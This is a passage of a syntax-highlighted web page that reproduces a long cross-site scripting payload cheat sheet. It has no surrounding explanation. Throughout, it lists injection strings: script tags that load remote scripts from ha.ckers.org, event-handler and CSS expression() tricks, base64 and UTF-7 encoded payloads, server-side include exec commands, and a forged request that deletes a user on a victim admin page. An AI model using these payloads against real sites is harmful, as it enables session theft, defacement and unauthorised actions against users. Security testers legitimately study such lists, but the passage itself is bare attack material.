class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> &#x27;&#x27; <span class="attr">SRC</span>=<span class="string">&quot;http://ha.ckers.org/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> &quot;<span class="attr">a</span>=<span class="string">&#x27;&gt;&#x27;</span>&quot; <span class="attr">SRC</span>=<span class="string">&quot;http://ha.ckers.org/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&#x27;&gt;&quot;</span> <span class="attr">SRC</span>=<span class="string">&quot;http://ha.ckers.org/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;SCRI&quot;</span>);</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&lt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&lt;&quot;&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&quot;&gt;&#x27;&gt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">88</span>,<span class="number">83</span>,<span class="number">83</span>))</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&quot;&gt;&#x27;&gt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="handlebars"><span class="xml">alert(String.fromCharCode(88,83,83))&lt;?/SCRIPT&gt;&amp;submit.x=27&amp;submit.y=9&amp;cmd=search<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;hellox worldss&quot;</span>)</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&amp;safe=high&amp;cx=006665157904466893121:su_tzknyxug&amp;cof=FORID:9#510<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&amp;search=10&amp;q=&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert%2?8String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode?(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83)%?29//--&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&quot;&gt;&#x27;&gt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">88</span>,<span class="number">83</span>%?2C83))</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&amp;submit-frmGoogleWeb=Web+Search<span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">blue</span>&gt;</span>hellox worldss<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">alert(</span>&#x27;<span class="attr">hellox</span> <span class="attr">worldss</span>&#x27;)&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">write(XSS)</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">write(XSS)</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">onscroll</span>=<span class="string">alert(XSS)</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>...<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">&quot;javascript:alert(XSS)&quot;</span>&gt;</span>lol<span class="comment">&lt;!--&lt;img src=&quot;--&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(XSS)//</span>&quot;&gt;</span>&lt;![&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;]&gt;&lt;img src=x onerror=alert(XSS)//&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;img src=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(XSS)//</span>&quot;&gt;</span>&lt;? foo=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;&lt;! foo=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;&lt;/ foo=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;&lt;? foo=&quot;&gt;<span class="tag">&lt;<span class="name">x</span> <span class="attr">foo</span>=<span class="string">&#x27;?&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>&gt;</span>&quot;&gt;&lt;! foo=&quot;[[[Inception]]&quot;&gt;<span class="tag">&lt;<span class="name">x</span> <span class="attr">foo</span>=<span class="string">&quot;]foo&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span>&lt;% foo&gt;<span class="tag">&lt;<span class="name">x</span> <span class="attr">foo</span>=<span class="string">&quot;%&gt;&lt;script&gt;alert(123)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;font-family:&#x27;foo<span class="symbol">&amp;#10;</span>;color:red;&#x27;;&quot;</span>&gt;</span>LOLLOL<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css">*&#123;<span class="comment">/*all*/</span><span class="attribute">color</span><span class="comment">/*all*/</span>:/*all*/red/*all*/;/<span class="selector-attr">[0]</span>*IE,Safari*<span class="selector-attr">[0]</span>/<span class="attribute">color</span>:green;<span class="attribute">color</span>:bl/*IE*/ue;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>(&#123;0:#0=alert/#0#/#0#(0)&#125;)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span>LOL<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span><span class="symbol">&amp;lt;</span>SCRIPT<span class="symbol">&amp;gt;</span>alert(/XSS/<span class="symbol">&amp;#46;</span>source)<span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span>\\&quot;;alert(&#x27;XSS&#x27;);//<span class="symbol">&amp;lt;</span>/TITLE<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT<span class="symbol">&amp;gt;</span>alert(\&quot;XSS\&quot;);<span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>INPUT TYPE=\&quot;IMAGE\&quot; SRC=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>BODY BACKGROUND=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>BODY ONLOAD=alert(&#x27;XSS&#x27;)<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG DYNSRC=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG LOWSRC=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>BGSOUND SRC=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>BR SIZE=\&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>LAYER SRC=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/scriptlet<span class="symbol">&amp;#46;</span>html\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/LAYER<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>LINK REL=\&quot;stylesheet\&quot; HREF=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>LINK REL=\&quot;stylesheet\&quot; HREF=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>css\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>STYLE<span class="symbol">&amp;gt;</span>@import&#x27;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>css&#x27;;<span class="symbol">&amp;lt;</span>/STYLE<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>META HTTP-EQUIV=\&quot;Link\&quot; Content=\&quot;<span class="symbol">&amp;lt;</span>http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>css<span class="symbol">&amp;gt;</span>; REL=stylesheet\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>STYLE<span class="symbol">&amp;gt;</span>BODY&#123;-moz-binding<span class="symbol">&amp;#58;</span>url(\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xssmoz<span class="symbol">&amp;#46;</span>xml#xss\&quot;)&#125;<span class="symbol">&amp;lt;</span>/STYLE<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>XSS STYLE=\&quot;behavior<span class="symbol">&amp;#58;</span> url(xss<span class="symbol">&amp;#46;</span>htc);\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>STYLE<span class="symbol">&amp;gt;</span>li &#123;list-style-image<span class="symbol">&amp;#58;</span> url(\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)\&quot;);&#125;<span class="symbol">&amp;lt;</span>/STYLE<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>UL<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>LI<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>IMG SRC=&#x27;vbscript<span class="symbol">&amp;#058;</span>msgbox(\&quot;XSS\&quot;)&#x27;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=\&quot;mocha<span class="symbol">&amp;#58;</span><span class="symbol">&amp;#91;</span>code<span class="symbol">&amp;#93;</span>\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=\&quot;livescript<span class="symbol">&amp;#058;</span><span class="symbol">&amp;#91;</span>code<span class="symbol">&amp;#93;</span>\&quot;<span class="symbol">&amp;gt;</span>žscriptualert(EXSSE)ž/scriptu<span class="symbol">&amp;lt;</span>META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=data<span class="symbol">&amp;#58;</span>text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0; URL=http<span class="symbol">&amp;#58;</span>//;URL=javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;lt;</span>IFRAME SRC=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/IFRAME<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>FRAMESET<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>FRAME SRC=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/FRAMESET<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>TABLE BACKGROUND=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>TABLE<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>TD BACKGROUND=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>DIV STYLE=\&quot;background-image<span class="symbol">&amp;#58;</span> url(javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;))\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>DIV STYLE=\&quot;background-image<span class="symbol">&amp;#58;</span>\0075\0072\006C\0028&#x27;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028<span class="symbol">&amp;#46;</span>1027\0058<span class="symbol">&amp;#46;</span>1053\0053\0027\0029&#x27;\0029\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>DIV STYLE=\&quot;background-image<span class="symbol">&amp;#58;</span> url(javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;))\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>DIV STYLE=\&quot;width<span class="symbol">&amp;#58;</span> expression(alert(&#x27;XSS&#x27;));\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>STYLE<span class="symbol">&amp;gt;</span>@im\port&#x27;\ja\vasc\ript<span class="symbol">&amp;#58;</span>alert(\&quot;XSS\&quot;)&#x27;;<span class="symbol">&amp;lt;</span>/STYLE<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG STYLE=\&quot;xss<span class="symbol">&amp;#58;</span>expr/*XSS*/ession(alert(&#x27;XSS&#x27;))\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>XSS STYLE=\&quot;xss<span class="symbol">&amp;#58;</span>expression(alert(&#x27;XSS&#x27;))\&quot;<span class="symbol">&amp;gt;</span>exp/*<span class="symbol">&amp;lt;</span>A STYLE=&#x27;no\xss<span class="symbol">&amp;#58;</span>noxss(\&quot;*//*\&quot;);xss<span class="symbol">&amp;#58;</span>ex<span class="symbol">&amp;#x2F;</span>*XSS*//*/*/pression(alert(\&quot;XSS\&quot;))&#x27;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>STYLE TYPE=\&quot;text/javascript\&quot;<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;);<span class="symbol">&amp;lt;</span>/STYLE<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>STYLE<span class="symbol">&amp;gt;</span><span class="symbol">&amp;#46;</span>XSS&#123;background-image<span class="symbol">&amp;#58;</span>url(\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)\&quot;);&#125;<span class="symbol">&amp;lt;</span>/STYLE<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A CLASS=XSS<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>STYLE type=\&quot;text/css\&quot;<span class="symbol">&amp;gt;</span>BODY&#123;background<span class="symbol">&amp;#58;</span>url(\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)\&quot;)&#125;<span class="symbol">&amp;lt;</span>/STYLE<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>!--<span class="symbol">&amp;#91;</span>if gte IE 4<span class="symbol">&amp;#93;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;);<span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>!<span class="symbol">&amp;#91;</span>endif<span class="symbol">&amp;#93;</span>--<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>BASE HREF=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);//\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>OBJECT TYPE=\&quot;text/x-scriptlet\&quot; DATA=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/scriptlet<span class="symbol">&amp;#46;</span>html\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/OBJECT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>OBJECT classid=clsid<span class="symbol">&amp;#58;</span>ae24fdae-03c6-11d1-8b76-0080c744f389<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>param name=url value=javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/OBJECT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>EMBED SRC=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>swf\&quot; AllowScriptAccess=\&quot;always\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/EMBED<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>EMBED SRC=\&quot;data<span class="symbol">&amp;#58;</span>image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\&quot; type=\&quot;image/svg+xml\&quot; AllowScriptAccess=\&quot;always\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/EMBED<span class="symbol">&amp;gt;</span>a=\&quot;get\&quot;;b=\&quot;URL(\\&quot;\&quot;;c=\&quot;javascript<span class="symbol">&amp;#058;</span>\&quot;;d=\&quot;alert(&#x27;XSS&#x27;);\\&quot;)\&quot;;eval(a+b+c+d);<span class="symbol">&amp;lt;</span>HTML xmlns<span class="symbol">&amp;#58;</span>xss<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>?import namespace=\&quot;xss\&quot; implementation=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>htc\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>xss<span class="symbol">&amp;#58;</span>xss<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/xss<span class="symbol">&amp;#58;</span>xss<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/HTML<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>XML ID=I<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>X<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>C<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>!<span class="symbol">&amp;#91;</span>CDATA<span class="symbol">&amp;#91;</span><span class="symbol">&amp;lt;</span>IMG SRC=\&quot;javas<span class="symbol">&amp;#93;</span><span class="symbol">&amp;#93;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>!<span class="symbol">&amp;#91;</span>CDATA<span class="symbol">&amp;#91;</span>cript<span class="symbol">&amp;#58;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;#93;</span><span class="symbol">&amp;#93;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/C<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/X<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/xml<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SPAN<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>XML ID=\&quot;xss\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>I<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>B<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=\&quot;javas<span class="symbol">&amp;lt;</span>!-- --<span class="symbol">&amp;gt;</span>cript<span class="symbol">&amp;#58;</span>alert(&#x27;XSS&#x27;)\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/B<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/I<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/XML<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SPAN DATASRC=\&quot;#xss\&quot; DATAFLD=\&quot;B\&quot; DATAFORMATAS=\&quot;HTML\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SPAN<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>XML SRC=\&quot;xsstest<span class="symbol">&amp;#46;</span>xml\&quot; ID=I<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/XML<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SPAN<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>HTML<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>BODY<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>?xml<span class="symbol">&amp;#58;</span>namespace prefix=\&quot;t\&quot; ns=\&quot;urn<span class="symbol">&amp;#58;</span>schemas-microsoft-com<span class="symbol">&amp;#58;</span>time\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>?import namespace=\&quot;t\&quot; implementation=\&quot;#default#time2\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>t<span class="symbol">&amp;#58;</span>set attributeName=\&quot;innerHTML\&quot; to=\&quot;XSS<span class="symbol">&amp;lt;</span>SCRIPT DEFER<span class="symbol">&amp;gt;</span>alert(<span class="symbol">&amp;quot;</span>XSS<span class="symbol">&amp;quot;</span>)<span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span>\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/BODY<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/HTML<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT SRC=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>jpg\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>!--#exec cmd=\&quot;/bin/echo &#x27;<span class="symbol">&amp;lt;</span>SCR&#x27;\&quot;--<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>!--#exec cmd=\&quot;/bin/echo &#x27;IPT SRC=http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>js<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span>&#x27;\&quot;--<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>? echo(&#x27;<span class="symbol">&amp;lt;</span>SCR)&#x27;;echo(&#x27;IPT<span class="symbol">&amp;gt;</span>alert(\&quot;XSS\&quot;)<span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span>&#x27;); ?<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=\&quot;http<span class="symbol">&amp;#58;</span>//www<span class="symbol">&amp;#46;</span>thesiteyouareon<span class="symbol">&amp;#46;</span>com/somecommand<span class="symbol">&amp;#46;</span>php?somevariables=maliciouscode\&quot;<span class="symbol">&amp;gt;</span>Redirect 302 /a<span class="symbol">&amp;#46;</span>jpg http<span class="symbol">&amp;#58;</span>//victimsite<span class="symbol">&amp;#46;</span>com/admin<span class="symbol">&amp;#46;</span>asp&amp;deleteuser<span class="symbol">&amp;lt;</span>META HTTP-EQUIV=\&quot;Set-Cookie\&quot; Content=\&quot;USERID=<span class="symbol">&amp;lt;</span>SCRIPT<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span>\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>HEAD<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>META HTTP-EQUIV=\&quot;CONTENT-TYPE\&quot; CONTENT=\&quot;text/html; charset=UTF-7\&quot;<span class="symbol">&amp;gt;</span> <span class="symbol">&amp;lt;</span>/HEAD<span class="symbol">&amp;gt;</span>+ADw-SCRIPT+AD4-alert(&#x27;XSS&#x27;);+ADw-/SCRIPT+AD4-<span class="symbol">&amp;lt;</span>SCRIPT a=\&quot;<span class="symbol">&amp;gt;</span>\&quot; SRC=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>js\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT =\&quot;<span class="symbol">&amp;gt;</span>\&quot; SRC=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>js\&quot;<span class="symbol">&amp;gt;</span><span 